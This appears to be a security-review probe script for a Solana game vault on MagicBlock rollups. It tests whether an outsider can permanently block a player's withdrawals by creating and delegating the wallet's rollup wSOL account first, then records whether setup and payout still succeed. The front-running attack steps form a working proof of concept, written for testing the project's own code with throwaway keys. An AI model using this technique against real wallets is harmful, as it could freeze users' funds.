// M10 review H1: can an outsider stop a player's withdrawals for good? The game's withdrawal moves the vault's
// money to the wallet's own rollup wSOL account (its eATA), then MagicBlock's shuttle takes it to Solana. The
// wallet's eATA is created only at the first withdrawal; an outsider can create it first and hand it to another
// validator (probe-m10-frontrun.ts step 1). Then: does the withdrawal setup fail, and can the vault still pay out?
// Writes results/m10-h1-<ts>.json.
import { ComputeBudgetProgram } from "@solana/web3.js";
import { Keypair, LAMPORTS_PER_SOL, PublicKey, SYSVAR_INSTRUCTIONS_PUBKEY, SystemProgram, Transaction } from "@solana/web3.js";
import { NATIVE_MINT, getAssociatedTokenAddressSync } from "@solana/spl-token";
import { delegateEphemeralAtaIx, deriveEphemeralAta, initEphemeralAtaIx } from "@magicblock-labs/ephemeral-rollups-sdk";
import nacl from "tweetnacl";
import fs from "fs";
import path from "path";
import { connection, loadKey, programFor, programOn, teeConnection } from "./lib";
import { BN, errName, sendL1, sleep } from "../tests/helpers";
import { depositToVaultIxs, ensureWalletInRollupIxs, openVaultAccounts, playKeyMessage, proofIx, vaultOf, vaultTokenOf, walletStateOf, walletTokenOf } from "../client-web/vault";

const out: any[] = [];
const note = (name: string, v: any) => { out.push({ name, ...v }); console.log(name, JSON.stringify(v).slice(0, 220)); };

async function main() {
  const deployer = loadKey("deployer");
  const w = Keypair.generate(), outsider = Keypair.generate();
  for (const [k, sol] of [[w, 0.06], [outsider, 0.01]] as const)
    await sendL1(new Transaction().add(SystemProgram.transfer({ fromPubkey: deployer.publicKey, toPubkey: k.publicKey, lamports: sol * LAMPORTS_PER_SOL })), [deployer]);
  await sendL1(new Transaction().add(ComputeBudgetProgram.setComputeUnitLimit({ units: 400_000 }), await programFor(w).methods.openVault().accountsPartial(openVaultAccounts(w.publicKey)).instruction()), [w]);
  await sendL1(new Transaction().add(...depositToVaultIxs(w.publicKey, 10_000_000n)), [w]);
  await sleep(10_000);

  // The outsider blocks the wallet's own rollup wSOL account before its first withdrawal.
  const [walletEata] = deriveEphemeralAta(w.publicKey, NATIVE_MINT);
  const block = await sendL1(new Transaction().add(initEphemeralAtaIx(walletEata, w.publicKey, NATIVE_MINT, outsider.publicKey), delegateEphemeralAtaIx(outsider.publicKey, walletEata, Keypair.generate().publicKey)), [outsider])
    .then((s) => ({ ok: true, sig: s })).catch((e) => ({ ok: false, err: errName(e) }));
  note("outsider blocks the wallet's own rollup wSOL account", block);

  // The game's withdrawal setup (EnsureWalletInRollup), then the vault -> wallet rollup account step.
  const setup = await sendL1(new Transaction().add(...(await ensureWalletInRollupIxs(w.publicKey))), [w]).then((s) => ({ ok: true, sig: s })).catch((e) => ({ ok: false, err: errName(e) }));
  note("withdrawal setup (the wallet's rollup account)", setup);
  await sleep(6000);
  const key = Keypair.generate(), exp = Math.floor(Date.now() / 1000) + 86_400;
  const msg = playKeyMessage(key.publicKey, exp, 0);
  const er = programOn(await teeConnection(key), key);
  const move = await er.methods.vaultWithdraw(BN(10_000_000), BN(exp)).accountsPartial({
    playKey: key.publicKey, wallet: w.publicKey, walletState: walletStateOf(w.publicKey), vault: vaultOf(w.publicKey), vaultToken: vaultTokenOf(w.publicKey),
    walletToken: walletTokenOf(w.publicKey), instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
  }).preInstructions([proofIx(w.publicKey, msg, nacl.sign.detached(msg, w.secretKey))]).rpc().then((s) => ({ ok: true, sig: s })).catch((e) => ({ ok: false, err: errName(e) }));
  note("play key moves the vault's money to the wallet's rollup account", move);
  const vt = await (await teeConnection(key)).getTokenAccountBalance(vaultTokenOf(w.publicKey)).then((b) => b.value.amount).catch((e) => "ERR " + String(e.message).slice(0, 80));
  note("vault balance afterwards", { amount: vt });
  const rec = await connection.getAccountInfo(PublicKey.findProgramAddressSync([Buffer.from("delegation"), walletEata.toBuffer()], new PublicKey("DELeGGvXpWV2fqJUhqcF5ZSYMS4JTLjteaAMARRSaeSh"))[0]);
  note("the wallet's rollup account is delegated to", { validator: rec ? new PublicKey(rec.data.subarray(8, 40)).toBase58() : null });
  const file = path.join(__dirname, "../results", `m10-h1-${Date.now()}.json`);
  fs.writeFileSync(file, JSON.stringify({ ranAt: new Date().toISOString(), wallet: w.publicKey.toBase58(), outcomes: out }, null, 2));
  console.log("->", path.relative(process.cwd(), file));
}
main().catch((e) => { console.error(e); process.exit(1); });
